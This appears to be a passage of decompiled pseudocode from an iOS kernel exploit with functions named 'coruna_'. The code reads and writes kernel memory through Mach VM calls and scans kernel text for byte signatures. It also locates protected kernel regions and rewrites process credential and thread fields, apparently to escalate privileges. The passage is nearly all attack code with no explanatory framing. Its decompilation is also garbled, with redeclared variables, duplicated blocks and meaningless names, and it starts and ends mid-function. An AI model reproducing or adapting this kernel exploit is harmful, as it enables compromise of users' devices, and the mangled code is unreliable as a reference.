    *(uint *)((long)handle + 0xc) = port;
    if (*(long *)k_kernel_stack_chk_guard_slot == plist) {
    return;
    }
    ___stack_chk_fail(kind);
  }
  str = region;
  handle = -3;
  while (ptr = k_kernel_mach_task_self_slot, handle != 0) {
    kind = coruna_kernel509_via_mach_vm_read_overwrite_2(base,*(long *)(&k_kernel_slot_18f0 + base) +
                                 (unsigned long)(uint)(*(int *)(base + 0x168) * ((int)handle + 4)),str
                         );
    str = str + 1;
    handle = handle + 1;
    if ((int)kind == 0) goto fail;
  }
  handle = coruna_call_macho_data_seg_25b54_35f28(base,*(uint32_t *)k_kernel_mach_task_self_slot,&serial_buf);
  version = 0x28026;
  if ((handle == 0) ||
     ((u = (uint)serial_buf, ((uint)serial_buf >> 10 & 1) == 0 &&
      (err = coruna_mach_vm_machine_attribute(base,handle,(uint)serial_buf | 0x400), err == 0))))
  handle = 0;
  err = true;
  do {
  status = err;
  err = *(int *)((long)&action + handle * 4);
  if (err != -1) {
  _close(err);
  }
  handle = 1;
  err = false;
  } while (status);
  handle = 0;
  do {
  port = *(uint *)((long)&path_buf + handle);
  if (port != 0xffffffff) {
  port = _close(port);
  }
  handle = handle + 4;
  } while (handle != 0x30);
  if (1 < sa_saved + 1) {
  port = _mach_port_deallocate(*(ipc_space_t *)ptr,sa_saved);
  }
  kind = (unsigned long)port;
  port = (uint)(version == 0);
  *(uint *)((long)handle + 0xc) = port;
  if (*(long *)k_kernel_stack_chk_guard_slot == plist) {
  return;
  }
  ___stack_chk_fail(kind);
}
void coruna_ioregistryentryfrompath(long handle,unsigned long arg)
{
  int err;
  uint64_t u;
  long handle;
  unsigned long size;
  int scratch [3];
  int bootargs;
  uint thread_attr;
  unsigned long host_info;
  
  if (arg == 0) {
    host_info = arg;
    u = _IORegistryEntryFromPath
                      (*(uint32_t *)k_kernel_kiomasterportdefault_slot,"IOService:/");
    if ((int)u + 1U < 2) {
      return;
    }
    handle = coruna_call_helper_25fa0(handle,u);
    if (handle == 0) {
      return;
    }
    host_info = coruna_kernel509_via_fn_ptr_cast_2_4(handle,handle);
    if (host_info == 0) {
      return;
    }
    err = coruna_kernel509_residual_307(handle,host_info,&host_info);
    if (err == 0) {
      return;
    }
    host_info = coruna_kernel509_via_fn_ptr_cast_10_10(handle,host_info);
    err = coruna_kernel509_residual_307(handle,host_info,&host_info);
    if (err == 0) {
      return;
    }
    arg = coruna_kernel509_via_fn_ptr_cast_10_10(handle,host_info);
  }
  handle = 0x4000;
  if (*(int *)(handle + 0x180) != 0x4000) {
    handle = 0x100000;
  }
  size = arg & -handle;
  if (*(int *)(handle + 0x180) != 0x4000) {
    size = (arg & -handle) + 0x4000;
  }
  if (0xfffeffffffffffff < size) {
    host_info = arg;
    while (err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,size,4,scratch), err != 0) {
      if (scratch[0] == -0x1120531) {
        err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,size + 4,0x18,(unsigned long)scratch | 4);
        if (err == 0) {
          return;
        }
        if (((bootargs == 2) && (8 < thread_attr)) && (thread_attr < 0x40)) {
          return;
        }
      }
      size = size - handle;
      if (size < 0xffff000000000000) {
        return;
      }
    }
  }
  return;
}
void coruna_kernel5_via_ctx_clear_12bc4(long handle,long addr_2)
{
  int err;
  void *ptr;
  uint32_t u;
  uint64_t size;
  uint64_t version;
  uint64_t port;
  
  if ((*(long *)(&k_kernel_slot_19f8 + handle) == 0) &&
     (((addr_2 != 0 || (addr_2 = coruna_ioregistryentryfrompath(handle,0), addr_2 != 0)) &&
      (ptr = _calloc(0x128,1), ptr != (void *)0x0)))) {
    coruna_ctx_clear_12bc4(ptr,handle);
    size = *(uint64_t *)(handle + 0x140);
    port = *(uint64_t *)(handle + 0x158);
    version = *(uint64_t *)(handle + 0x150);
    *(uint64_t *)((long)ptr + 0x78) = *(uint64_t *)(handle + 0x148);
    *(uint64_t *)((long)ptr + 0x70) = size;
    *(uint64_t *)((long)ptr + 0x88) = port;
    *(uint64_t *)((long)ptr + 0x80) = version;
    *(uint64_t *)((long)ptr + 0x90) = *(uint64_t *)(handle + 0x160);
    *(uint32_t *)((long)ptr + 0x98) = *(uint32_t *)(handle + 0x178);
    *(uint32_t *)((long)ptr + 0x38) = *(uint32_t *)(handle + 0x180);
    u = 0x480;
    if (*(unsigned long *)(handle + 0x158) >> 0x2b < 1099) {
      u = 0x80;
    }
    err = coruna_call_find_text_exec(ptr,0,addr_2,u);
    if (err != 0) {
      *(void **)(&k_kernel_slot_19f8 + handle) = ptr;
    }
  }
  return;
}
void coruna_kernel509_via_kernel509_str_5f_00_00_71_20_01_00_54(long handle)
{
  int err;
  long handle;
  uint64_t scratch;
  uint64_t bootargs;
  
  err = coruna_kernel509_str_5f_00_00_71_20_01_00_54(*(uint64_t *)(&k_kernel_slot_19f8 + handle),&bootargs,&scratch);
  if ((err != 0) && (handle = coruna_call_return_zero_61a8_20f50(), handle != 0)) {
    *(uint64_t *)(&k_kernel_slot_1870 + handle) = bootargs;
    *(uint64_t *)(&k_kernel_slot_1878 + handle) = scratch;
    *(long *)(&k_kernel_slot_1880 + handle) = handle;
  }
  return;
}
void coruna_find_ppltext_3b194(uint64_t *val,long handle)
{
  int err;
  long handle;
  unsigned long u;
  uint64_t scratch;
  unsigned long scratch;
  long bootargs;
  
  *val = 0;
  val[1] = 0;
  val[2] = 0;
  err = coruna_fn_ptr_cast_10(handle,0x20);
  if (err == 0) {
    err = coruna_fn_ptr_cast_10(handle,0x5184001);
    if (err != 0) {
      coruna_macho_find_loadcmd(&scratch,*(uint64_t *)(&k_kernel_slot_19f8 + handle),"__PPLTEXT");
      val[1] = scratch;
      *val = scratch;
      val[2] = bootargs;
      return;
    }
    coruna_macho_text_sect(&scratch,*(uint64_t *)(&k_kernel_slot_19f8 + handle));
    if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
      *val = scratch;
      val[1] = scratch;
      val[2] = bootargs;
      return;
    }
    scratch = (scratch + bootargs) - 0x20000;
    bootargs = 0x20000;
    handle = coruna_strsep(&scratch,"08 DC 70 92",0,1);
    if ((handle != 0) &&
       (u = coruna_kernel509_via_kernel509_via_kernel5_residual_226_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -4), u != 0)) {
      coruna_macho_text_sect(&scratch,*(uint64_t *)(&k_kernel_slot_19f8 + handle));
      if ((scratch < u || scratch - u == 0) && (u < bootargs + scratch)) {
        *val = scratch;
        val[1] = u;
        handle = (scratch - u) + bootargs;
        val[2] = handle;
        if (handle != 0) {
          return;
        }
      }
    }
  }
  coruna_macho_text_sect(&scratch,*(uint64_t *)(&k_kernel_slot_19f8 + handle));
fail:
  val[1] = scratch;
  *val = scratch;
  val[2] = bootargs;
  return;
}
void coruna_task_info_2c258(long handle,uint64_t val,int flags,uint64_t id_2,unsigned long arg)
{
  kern_return_t lk1;
  int err;
  long handle;
  task_flavor_t flavor;
  unsigned long u;
  uint size;
  mach_msg_type_number_t scratch;
  uint8_t bootargs[32];
  uint64_t thread_attr[4];
  
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (err - 0x1f53U < 2) goto fail;
    if (err == 0x1809) {
      size = 0xa0;
      if (flags - 1U < 2) {
      scratch = 2;
      flavor = 0xd;
      err = 8;
      }
      else {
      if (flags != 3) {
      return;
      }
      size = size + 8;
      scratch = 8;
      flavor = 0xf;
      err = 0x20;
      }
      if (err == (int)arg) {
      lk1 = _task_info((task_name_t)val,flavor,(task_info_t)thread_attr,&scratch);
      if (lk1 == 0) {
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
      handle = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4(handle,val);
      }
      else {
      handle = coruna_kernel509_via_fn_ptr_cast_2_10();
      }
      if (handle != 0) {
      handle = handle + (unsigned long)size;
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,handle,arg & 0xffffffff,bootargs);
      if ((err != 0) && (err = _memcmp(bootargs,thread_attr,arg & 0xffffffff), err == 0))
      {
      if ((*(long *)(&k_kernel_slot_1900 + handle) == 0) &&
      ((flags == 2 &&
      (*(task_name_t *)k_kernel_mach_task_self_slot == (task_name_t)val)))) {
      *(uint64_t *)(&k_kernel_slot_1908 + handle) = thread_attr[0];
      *(long *)(&k_kernel_slot_1900 + handle) = handle;
      }
      coruna_kernel509_via_fn_ptr_cast_10_15(handle,handle,id_2,arg);
      }
      }
      }
      }
      return;
    }
    if (err != 0x1c1b) {
      return;
    }
    size = 0x94;
    u = 0x1c1b19145fffff;
  }
  else {
    if ((err != 0x2258 && err != 0x2712) && err != 0x225c) {
      return;
    }
fail:
    size = 0x40;
    u = 0x1f530f027fffff;
  }
  if (*(unsigned long *)(handle + 0x158) <= u) {
    size = 0x9c;
  }
done:
  if (flags - 1U < 2) {
    scratch = 2;
    flavor = 0xd;
    err = 8;
  }
  else {
    if (flags != 3) {
      return;
    }
    size = size + 8;
    scratch = 8;
    flavor = 0xf;
    err = 0x20;
  }
  if (err == (int)arg) {
    lk1 = _task_info((task_name_t)val,flavor,(task_info_t)thread_attr,&scratch);
    if (lk1 == 0) {
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        handle = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4(handle,val);
      }
      else {
        handle = coruna_kernel509_via_fn_ptr_cast_2_10();
      }
      if (handle != 0) {
        handle = handle + (unsigned long)size;
        err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,handle,arg & 0xffffffff,bootargs);
        if ((err != 0) && (err = _memcmp(bootargs,thread_attr,arg & 0xffffffff), err == 0))
        {
          if ((*(long *)(&k_kernel_slot_1900 + handle) == 0) &&
             ((flags == 2 &&
              (*(task_name_t *)k_kernel_mach_task_self_slot == (task_name_t)val)))) {
            *(uint64_t *)(&k_kernel_slot_1908 + handle) = thread_attr[0];
            *(long *)(&k_kernel_slot_1900 + handle) = handle;
          }
          coruna_kernel509_via_fn_ptr_cast_10_15(handle,handle,id_2,arg);
        }
      }
    }
  }
  return;
}
void coruna_pthread_attr_setdetachstate_2c464(long handle,uint64_t *val,uint64_t id_2,void *ctx)
{
  int err;
  mach_port_t target_act;
  kern_return_t lk2;
  void **lppv3;
  pthread_t scratch;
  pthread_attr_t bootargs;
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = (pthread_t)0x0;
  err = _pthread_attr_init(&bootargs);
  if (err == 0) {
    err = _pthread_attr_setdetachstate(&bootargs,1);
    if (err == 0) {
      lppv3 = (void **)coruna_kernel509_via_helper_5d2c_419fc(id_2);
      err = _pthread_create_suspended_np(&scratch,&bootargs,lppv3,ctx);
      if ((err == 0) && (target_act = _pthread_mach_thread_np(scratch), target_act != 0)) {
        err = *(int *)(&k_kernel_slot_191c + handle);
        if (err == 0) {
          err = *(int *)(&k_kernel_slot_1918 + handle);
        }
        err = coruna_kernel509_via_kernel509_via_kernel509_via_kernel509_via_kernel509_via_fn_ptr_cast_2_6(handle,err,target_act);
        if ((err != 0) && (lk2 = _thread_resume(target_act), lk2 == 0)) {
          *val = scratch;
        }
      }
    }
    err = _pthread_attr_destroy(&bootargs);
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(err);
}
void coruna_kernel509_via_kernel509_via_kernel509_via_kernel509_via_kernel509_via_fn_ptr_cast_2_6(long handle,uint64_t val,uint64_t id_2)
{
  int err;
  long handle;
  long addr;
  uint32_t u;
  uint8_t scratch[8];
  
  u = 0x4000000;
  if (0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) {
    u = 1;
  }
  if ((int)val == 0) {
    coruna_kernel509_via_kernel509_via_mach_vm_read_overwrite_7(handle,id_2,u,0);
  }
  else {
    handle = coruna_kernel509_via_kernel509_via_kernel509_via_kernel509_via_fn_ptr_cast_2_6(handle,val,0);
    if ((((handle != 0) && (addr = coruna_kernel509_via_kernel509_via_fn_ptr_cast_10_22(handle,id_2), addr != 0)) &&
        (err = coruna_kernel509_residual_307(handle,addr,scratch), err != 0)) &&
       (err = coruna_kernel509_via_kernel509_via_mach_vm_read_overwrite_7(handle,id_2,u,1), err != 0)) {
      coruna_kernel509_via_kernel509_via_kernel509_via_mach_vm_read_overwrite_2(handle,handle);
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        coruna_call_mach_vm_machine_attribute_1d4f8_2b508(handle,addr,handle);
      }
      else {
        coruna_kernel509_via_fn_ptr_cast_10_14();
      }
    }
  }
  return;
}
void coruna_pthread_join_2c6d8(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  int err;
  pthread_t scratch;
  
  scratch = (pthread_t)0x0;
  err = coruna_pthread_attr_setdetachstate_2c464(val,&scratch,id_2,size_3);
  if (err == 0) {
    _pthread_join(scratch,(void **)0x0);
  }
  return;
}
void coruna_getuid(long handle,uint size,int flags,int count_2)
{
  uint8_t *ptr;
  uid_t u;
  int err;
  long handle;
  uint scratch;
  uint scratch;
  uint bootargs;
  uint32_t thread_attr;
  int bootargs;
  uint32_t host_info;
  uint64_t serial_buf;
  uint64_t thread_attr;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t host_info;
  uint64_t sa_saved;
  int serial_buf;
  int action;
  uint64_t block_ctx;
  uint64_t sa_new;
  uint32_t path_buf;
  uint64_t stack_guard;
  uint32_t tmp_buf;
  uint64_t region;
  uint64_t sa_saved;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t sa_new;
  uint64_t frame;
  int path_buf;
  uint8_t tmp_buf[28];
  uint region;
  long plist;
  long url_buf;
  long json_buf;
  unsigned long frame;
  
  u = _getuid();
  ptr = k_kernel_mach_task_self_slot;
  handle = coruna_kernel509_via_kernel509_via_kernel509_via_kernel509_via_fn_ptr_cast_2_6(handle,*(uint32_t *)k_kernel_mach_task_self_slot,0);
  if (handle == 0) {
    return;
  }
  err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,handle + 0x68,4,&path_buf);
  if (err == 0) {
    return;
  }
  if ((*(int *)(&k_kernel_slot_1910 + handle) == 0) && (*(int *)(&k_kernel_slot_1914 + handle) == 0)) {
    *(uid_t *)(&k_kernel_slot_1910 + handle) = u;
    *(int *)(&k_kernel_slot_1914 + handle) = path_buf;
  }
  if ((u == size) && (path_buf == flags)) {
    return;
  }
  if (count_2 == 0) {
    err = coruna_fn_ptr_cast_10(handle,4);
    if (err != 0) {
      return;
    }
    handle = *(long *)(&k_kernel_slot_18e0 + handle);
    err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,handle + 0x18,0x58,&block_ctx);
    if (err != 0) {
    serial_buf = region;
    action = plist;
    thread_attr = sa_saved;
    stack_guard = json_buf;
    block_ctx = url_buf;
    sa_saved = frame;
    host_info = sa_new;
    _local_160 = coruna_u64_pack((size), (size));
    _uStack_158 = coruna_u64_pack((path_buf), (size));
    _local_150 = coruna_u64_pack((tmp_buf), (flags));
    serial_buf = flags;
    action = flags;
    err = _memcmp(&scratch,&block_ctx,0x58);
    if (((err == 0) || (err = coruna_kernel509_via_fn_ptr_cast_10_15(handle,handle + 0x18,&scratch,0x58), err != 0))
    && (frame = coruna_helper_16fd0_34c1c(handle,*(uint32_t *)ptr), frame != 0)) {
    err = *(int *)(handle + 0x140);
    if (err < 0x2258) {
    if (err - 0x1f53U < 2) {
    handle = 0xb0;
    }
    else if (err == 0x1809) {
    handle = 200;
    }
    else {
    if (err != 0x1c1b) {
    return;
    }
    handle = 0xb8;
    }
    }
    else {
    if (((err != 0x2258) && (err != 0x225c)) && (err != 0x2712)) {
    return;
    }
    handle = 0xa8;
    }
    err = coruna_kernel509_residual_307(handle,handle + frame,&frame);
    if (err != 0) {
    if (frame == 0) {
    err = coruna_fn_ptr_cast_10(handle,0x5584001);
    if (err == 0) {
    handle = coruna_kernel509_via_kernel509_via_kernel509_via_kernel5_residual_226_2(handle,0);
    if ((handle != 0) &&
    (err = coruna_open_m2scaler_1f43c(handle,handle,size,1,0,0,&frame), err != 0)) {
    coruna_open_m2scaler_1f43c(handle,handle,u,0xffffffffffffffff,0,0,&frame);
    }
    }
    else {
    handle = *(long *)(&k_kernel_slot_1990 + handle);
    if (handle == 0) {
    coruna_macho_text_sect(tmp_buf,*(uint64_t *)(&k_kernel_slot_19f8 + handle));
    handle = coruna_strsep(tmp_buf,"00 7D 04 13 .. .. .. .. .. .. .. .. 21 05 80 52",0,1)
    ;
    if (handle == 0) {
    return;
    }
    handle = coruna_ret_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + 4);
    if (handle == 0) {
    return;
    }
    *(long *)(&k_kernel_slot_1990 + handle) = handle;
    }
    err = coruna_kernel509_residual_307(handle,handle,&frame);
    if (((((err != 0) && (frame < 0x400)) &&
    (err = coruna_kernel509_residual_307(handle,handle + *(int *)(handle + 0x168),&json_buf),
    err != 0)) &&
    ((handle = coruna_fn_ptr_cast_2(handle,json_buf), handle != 0 &&
    (err = coruna_kernel509_residual_307(handle,json_buf +
    (frame & size) *
    (long)*(int *)(handle + 0x168),&url_buf),
    err != 0)))) && (handle = coruna_fn_ptr_cast_2(handle,url_buf), handle != 0)) {
    while (err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,url_buf + (long)*(int *)(handle + 0x168) * 2,4,
    &region), err != 0) {
    if (region == size) {
    err = coruna_kernel509_residual_307(handle,url_buf + (long)*(int *)(handle + 0x168) * 3,
    &plist);
    if (err == 0) {
    return;
    }
    plist = plist + 4;
    coruna_kernel509_residual_308(handle,url_buf + (long)*(int *)(handle + 0x168) * 3);
    return;
    }
    err = coruna_kernel509_residual_307(handle,url_buf,&url_buf);
    if (err == 0) {
    return;
    }
    url_buf = coruna_fn_ptr_cast_2(handle,url_buf);
    if (url_buf == 0) {
    return;
    }
    }
    }
    }
    }
    else {
    coruna_fn_ptr_cast_2(handle);
    }
    }
    }
    }
    return;
  }
  block_ctx = 0;
  handle = coruna_kernel509_via_kernel509_via_kernel509_via_kernel509_via_fn_ptr_cast_2_6(handle,*(uint32_t *)ptr,&block_ctx);
  if (handle == 0) {
    return;
  }
  if (*(long *)(&k_kernel_slot_18e0 + handle) == 0) {
    *(long *)(&k_kernel_slot_18e0 + handle) = handle;
    *(uint64_t *)(&k_kernel_slot_18e8 + handle) = block_ctx;
  }
fail:
  err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,handle + 0x18,0x58,&block_ctx);
  if (err != 0) {
    serial_buf = region;
    action = plist;
    thread_attr = sa_saved;
    stack_guard = json_buf;
    block_ctx = url_buf;
    sa_saved = frame;
    host_info = sa_new;
    _local_160 = coruna_u64_pack((size), (size));
    _uStack_158 = coruna_u64_pack((path_buf), (size));
    _local_150 = coruna_u64_pack((tmp_buf), (flags));
    serial_buf = flags;
    action = flags;
    err = _memcmp(&scratch,&block_ctx,0x58);
    if (((err == 0) || (err = coruna_kernel509_via_fn_ptr_cast_10_15(handle,handle + 0x18,&scratch,0x58), err != 0))
       && (frame = coruna_helper_16fd0_34c1c(handle,*(uint32_t *)ptr), frame != 0)) {
      err = *(int *)(handle + 0x140);
      if (err < 0x2258) {
        if (err - 0x1f53U < 2) {
          handle = 0xb0;
        }
        else if (err == 0x1809) {
          handle = 200;
        }
        else {
          if (err != 0x1c1b) {
            return;
          }
          handle = 0xb8;
        }
      }
      else {
        if (((err != 0x2258) && (err != 0x225c)) && (err != 0x2712)) {
          return;
        }
        handle = 0xa8;
      }
      err = coruna_kernel509_residual_307(handle,handle + frame,&frame);
      if (err != 0) {
        if (frame == 0) {
          err = coruna_fn_ptr_cast_10(handle,0x5584001);
          if (err == 0) {
            handle = coruna_kernel509_via_kernel509_via_kernel509_via_kernel5_residual_226_2(handle,0);
            if ((handle != 0) &&
               (err = coruna_open_m2scaler_1f43c(handle,handle,size,1,0,0,&frame), err != 0)) {
              coruna_open_m2scaler_1f43c(handle,handle,u,0xffffffffffffffff,0,0,&frame);
            }
          }
          else {
            handle = *(long *)(&k_kernel_slot_1990 + handle);
            if (handle == 0) {
              coruna_macho_text_sect(tmp_buf,*(uint64_t *)(&k_kernel_slot_19f8 + handle));
              handle = coruna_strsep(tmp_buf,"00 7D 04 13 .. .. .. .. .. .. .. .. 21 05 80 52",0,1)
              ;
              if (handle == 0) {
                return;
              }
              handle = coruna_ret_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + 4);
              if (handle == 0) {
                return;
              }
              *(long *)(&k_kernel_slot_1990 + handle) = handle;
            }
            err = coruna_kernel509_residual_307(handle,handle,&frame);
            if (((((err != 0) && (frame < 0x400)) &&
                 (err = coruna_kernel509_residual_307(handle,handle + *(int *)(handle + 0x168),&json_buf),
                 err != 0)) &&
                ((handle = coruna_fn_ptr_cast_2(handle,json_buf), handle != 0 &&
                 (err = coruna_kernel509_residual_307(handle,json_buf +
                                               (frame & size) *
                                               (long)*(int *)(handle + 0x168),&url_buf),
                 err != 0)))) && (handle = coruna_fn_ptr_cast_2(handle,url_buf), handle != 0)) {
              while (err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,url_buf + (long)*(int *)(handle + 0x168) * 2,4,
                                          &region), err != 0) {
                if (region == size) {
                  err = coruna_kernel509_residual_307(handle,url_buf + (long)*(int *)(handle + 0x168) * 3,
                                       &plist);
                  if (err == 0) {
                    return;
                  }
                  plist = plist + 4;
                  coruna_kernel509_residual_308(handle,url_buf + (long)*(int *)(handle + 0x168) * 3);
                  return;
                }
                err = coruna_kernel509_residual_307(handle,url_buf,&url_buf);
                if (err == 0) {
                  return;
                }
                url_buf = coruna_fn_ptr_cast_2(handle,url_buf);
                if (url_buf == 0) {
                  return;
                }
              }
            }
          }
        }
        else {
          coruna_fn_ptr_cast_2(handle);
        }
      }
    }
  }
  return;
}
void coruna_kernel509_via_kernel509_via_mach_vm_read_overwrite_5(uint64_t val,uint64_t id_2,uint size,uint *flags_2)
{
  int err;
  uint scratch;
  
  err = coruna_kernel509_via_mach_vm_read_overwrite(val,id_2,&scratch);
  if (err != 0) {
    if (flags_2 != (uint *)0x0) {
      *flags_2 = scratch & 0x3ff;
    }
    scratch = scratch & 0xfffffc00 | size & 0x3ff;
    coruna_mach_vm_machine_attribute(val,id_2);
  }
  return;
}
void coruna_host_get_special_port(uint *size)
{
  mach_port_t host_priv;
  kern_return_t lk1;
  int err;
  long handle;
  unsigned long u;
  uint32_t scratch;
  mach_port_t bootargs;
  
  host_priv = _mach_host_self();
  if ((size[0x648] + 1 < 2) &&
     (lk1 = _host_get_special_port(host_priv,-1,2,&bootargs), lk1 != 0)) {
    u = *(unsigned long *)(size + 0x56);
    if ((u < 0x1f530000000000) ||
       ((((*size & 0x5584001) == 0 && (u < 0x22580a06c00000)) &&
        ((u < 0x1f543c40800000 || (0x2257 < (int)size[0x50])))))) {
      handle = coruna_call_helper_25fa0(size,host_priv);
      if ((handle != 0) && (err = coruna_kernel509_via_kernel509_via_mach_vm_read_overwrite_5(size,handle,4,&scratch), err != 0)) {
        _host_get_special_port(host_priv,-1,2,&bootargs);
        coruna_kernel509_via_kernel509_via_mach_vm_read_overwrite_5(size,handle,scratch,0);
      }
    }
    else {
      handle = coruna_kernel509_via_processor_set_info(size,2);
      if (handle != 0) {
        coruna_mach_port_request_notification(size,handle,&bootargs);
      }
    }
  }
  return;
}
void coruna_kernel509_via_mach_port_request_notification(long handle)
{
  long handle;
  uint8_t scratch[4];
  
  if ((*(int *)(&k_kernel_slot_1924 + handle) + 1U < 2) && (handle = coruna_kernel509_via_processor_set_info(handle,0), handle != 0))
  {
    coruna_mach_port_request_notification(handle,handle,scratch);
  }
  return;
}
void coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_10(long handle,uint64_t val)
{
  int err;
  long handle;
  unsigned long *ptr;
  unsigned long scratch;
  unsigned long bootargs [4];
  long thread_attr;
  
  ptr = &scratch;
  err = coruna_fn_ptr_cast_10(handle,0x20);
  if ((((err != 0) && (handle = coruna_kernel509_via_kernel5_residual_269(handle,val), handle != 0)) &&
      (err = coruna_kernel509_residual_307(handle,handle + 0xb0,&thread_attr), err != 0)) &&
     (((handle = coruna_fn_ptr_cast_2(handle,thread_attr), handle != 0 &&
       (err = coruna_kernel509_residual_307(handle,thread_attr + 0x50,bootargs + 3), err != 0)) &&
      ((bootargs[3] != 0 &&
       ((handle = *(long *)(handle + 0x128), handle != 0 && (bootargs[3] != handle)))))))) {
    bootargs[1] = 0;
    bootargs[2] = 0;
    scratch = 0;
    bootargs[0] = 0;
    err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,handle + 0x28,8,bootargs);
    if ((err != 0) &&
       (((err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,*(long *)(handle + 0x128) + 0x30,8,&scratch), err != 0 &&
         (err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,bootargs[3] + 0x28,8,bootargs + 2), err != 0)) &&
        (err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,bootargs[3] + 0x30,8,bootargs + 1), err != 0)))) {
      if (bootargs[0] < bootargs[2]) {
        handle = bootargs[3] + 0x28;
        ptr = bootargs;
      }
      else {
        handle = bootargs[3] + 0x30;
      }
      coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614_2(handle,handle,ptr,8);
    }
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_10_26(long handle,uint64_t val,int flags)
{
  bool err;
  int err;
  long handle;
  long addr;
  long scratch;
  unsigned long bootargs;
  uint thread_attr;
  
  thread_attr = 0;
  err = coruna_kernel509_via_fn_ptr_cast_10_17();
  if (err == 0) {
    return;
  }
  if (flags == 0) {
    err = coruna_fn_ptr_cast_10(handle,0x20);
    if (err == 0) {
      err = coruna_fn_ptr_cast_10(handle,0x5184001);
      err = *(int *)(handle + 0x140);
      if (err < 0x1f54) {
      addr = 0x10c;
      if ((err != 0x1809) && (err != 0x1c1b)) {
      if (err != 0x1f53) {
      return;
      }
      addr = 0x11c;
      }
      }
      else {
      if (err < 0x225c) {
      if (err == 0x1f54) {
      addr = 0x94;
      handle = coruna_kernel509_via_fn_ptr_cast_9(handle,val);
      if (handle != 0) {
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,handle + addr,4,&thread_attr);
      if (err != 0) {
      thread_attr = thread_attr & 0xfffff800 | thread_attr & 0x3ff | (uint)(flags != 0) << 10;
      coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,handle + addr,&thread_attr,4);
      }
      }
      return;
      }
      if (err != 0x2258) {
      return;
      }
      }
      else if (err != 0x225c) {
      if (err != 0x2712) {
      return;
      }
      addr = 200;
      handle = coruna_kernel509_via_fn_ptr_cast_9(handle,val);
      if (handle != 0) {
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,handle + addr,4,&thread_attr);
      if (err != 0) {
      thread_attr = thread_attr & 0xfffff800 | thread_attr & 0x3ff | (uint)(flags != 0) << 10;
      coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,handle + addr,&thread_attr,4);
      }
      }
      return;
      }
      addr = 0xb4;
      }
      handle = coruna_kernel509_via_fn_ptr_cast_9(handle,val);
      if (handle != 0) {
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,handle + addr,4,&thread_attr);
      if (err != 0) {
      thread_attr = thread_attr & 0xfffff800 | thread_attr & 0x3ff | (uint)(flags != 0) << 10;
      coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,handle + addr,&thread_attr,4);
      }
      }
      return;
    }
    else {
      addr = coruna_kernel509_via_kernel5_residual_269(handle,val);
      if (addr == 0) {
        return;
      }
      err = coruna_kernel509_residual_307(handle,addr + 0xb0,&bootargs);
      if (err == 0) {
        return;
      }
      addr = coruna_fn_ptr_cast_2(handle,bootargs);
      if (addr == 0) {
        return;
      }
      err = coruna_kernel509_residual_307(handle,bootargs + 0x50,&scratch);
      if (err == 0) {
        return;
      }
      err = *(int *)(handle + 0x140);
      if (err < 0x1f54) {
      addr = 0x10c;
      if ((err != 0x1809) && (err != 0x1c1b)) {
      if (err != 0x1f53) {
      return;
      }
      addr = 0x11c;
      }
      }
      else {
      if (err < 0x225c) {
      if (err == 0x1f54) {
      addr = 0x94;
      handle = coruna_kernel509_via_fn_ptr_cast_9(handle,val);
      if (handle != 0) {
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,handle + addr,4,&thread_attr);
      if (err != 0) {
      thread_attr = thread_attr & 0xfffff800 | thread_attr & 0x3ff | (uint)(flags != 0) << 10;
      coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,handle + addr,&thread_attr,4);
      }
      }
      return;
      }
      if (err != 0x2258) {
      return;
      }
      }
      else if (err != 0x225c) {
      if (err != 0x2712) {
      return;
      }
      addr = 200;
      handle = coruna_kernel509_via_fn_ptr_cast_9(handle,val);
      if (handle != 0) {
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,handle + addr,4,&thread_attr);
      if (err != 0) {
      thread_attr = thread_attr & 0xfffff800 | thread_attr & 0x3ff | (uint)(flags != 0) << 10;
      coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,handle + addr,&thread_attr,4);
      }
      }
      return;
      }
      addr = 0xb4;
      }
      handle = coruna_kernel509_via_fn_ptr_cast_9(handle,val);
      if (handle != 0) {
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,handle + addr,4,&thread_attr);
      if (err != 0) {
      thread_attr = thread_attr & 0xfffff800 | thread_attr & 0x3ff | (uint)(flags != 0) << 10;
